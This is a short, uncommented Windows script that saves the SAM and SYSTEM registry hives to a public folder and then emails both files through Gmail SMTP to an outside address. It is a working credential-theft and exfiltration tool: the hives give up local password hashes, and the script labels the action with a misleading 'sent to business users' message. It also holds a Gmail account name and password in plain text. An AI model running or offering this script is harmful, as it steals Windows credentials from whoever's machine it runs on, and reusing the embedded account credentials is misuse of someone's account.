reg save hklm\sam C:\Users\Public\sam
reg save hklm\system C:\Users\Public\system

$Body = "Sample Email Body"  
$SmtpServer = 'smtp.gmail.com'  
$SmtpUser = 'rogermoor283@gmail.com'  
$smtpPassword = '822247581'  
$MailtTo = 'joelhutchinson407@gmail.com'  
$MailFrom = 'rogermoor283@gmail.com'  
$MailSubject = "Testing Mail Attachments using $SmtpServer"  
$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |  
ConvertTo-SecureString -AsPlainText -Force)  
Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body "$Body" -Attachments "C:\Users\Public\sam" -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  
write-Output "Custom Message : Attachment Email Sent to Business Users"

$Body = "Sample Email Body"  
$SmtpServer = 'smtp.gmail.com'  
$SmtpUser = 'rogermoor283@gmail.com'  
$smtpPassword = '822247581'  
$MailtTo = 'joelhutchinson407@gmail.com'  
$MailFrom = 'rogermoor283@gmail.com'  
$MailSubject = "Testing Mail Attachments using $SmtpServer"  
$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |  
ConvertTo-SecureString -AsPlainText -Force)  
Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body "$Body" -Attachments "C:\Users\Public\system" -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  
write-Output "Custom Message : Attachment Email Sent to Business Users"